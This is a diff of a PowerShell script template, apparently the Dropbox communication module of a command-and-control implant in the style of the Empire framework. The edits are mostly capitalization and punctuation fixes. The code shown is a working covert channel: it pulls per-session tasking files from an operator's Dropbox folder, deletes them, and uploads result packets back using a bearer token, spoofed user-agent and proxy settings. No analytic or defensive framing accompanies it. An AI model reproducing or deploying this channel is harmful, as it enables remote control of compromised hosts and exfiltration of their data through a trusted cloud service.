@@ -1,6 +1,6 @@
 $Script:APIToken = "{{ api_token}}";
 
-$script:GetTask = {
+$Script:GetTask = {
         try {
             # build the web request object
             $wc= New-Object System.Net.WebClient;
@@ -12,31 +12,31 @@ $script:GetTask = {
                 $wc.Proxy = $Script:Proxy;
             }
 
-            $wc.Headers.Add("User-Agent", $script:UserAgent);
+            $wc.Headers.Add("User-Agent", $Script:UserAgent);
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
 
             $TaskingsFolder = '{{ tasking_folder }}';
             $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}");
+            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
             $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
 
             if($Data -and ($Data.Length -ne 0)) {
                 # if there was a tasking data, remove it
                 $wc.Headers.Add("Content-Type", " application/json");
                 $wc.Headers.Remove("Dropbox-API-Arg");
-                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}");
+                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($Script:SessionID).txt`"}");
                 $Data;
             }
-            $script:MissedCheckins = 0;
+            $Script:MissedCheckins = 0;
         }
         catch {
             if ($_ -match 'Unable to connect') {
-                $script:MissedCheckins += 1;
+                $Script:MissedCheckins += 1;
             }
         }
-    }
+    };
 
-$script:SendMessage = {
+$Script:SendMessage = {
     param($Packets)
 
     if ($Packets)
@@ -59,7 +59,7 @@ $script:SendMessage = {
         }
 
         $wc.Headers.Add('User-Agent', $Script:UserAgent);
-        $Script:Headers.GetEnumerator() | ForEach-Object { { $wc.Headers.Add($_.Name, $_.Value) } };
+        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
 
         $ResultsFolder = '{{ results_folder }}';
 
@@ -71,7 +71,7 @@ $script:SendMessage = {
             {
                 $Data = $Null;
                 $wc.Headers.Set("Authorization", "Bearer $( $Script:APIToken )");
-                $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$( $script:SessionID ).txt`"}");
+                $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$( $Script:SessionID ).txt`"}");
                 $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
             }
             catch
@@ -93,16 +93,16 @@ $script:SendMessage = {
 
             $wc2.Headers.Add("Authorization", "Bearer $( $Script:APIToken )");
             $wc2.Headers.Add("Content-Type", "application/octet-stream");
-            $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$( $script:SessionID ).txt`"}");
+            $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($Script:SessionID).txt`"}");
             $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket);
-            $script:MissedCheckins = 0;
+            $Script:MissedCheckins = 0;
         }
         catch
         {
             if ($_ -match 'Unable to connect')
             {
-                $script:MissedCheckins += 1;
+                $Script:MissedCheckins += 1;
             }
         }
     }
-}
+};
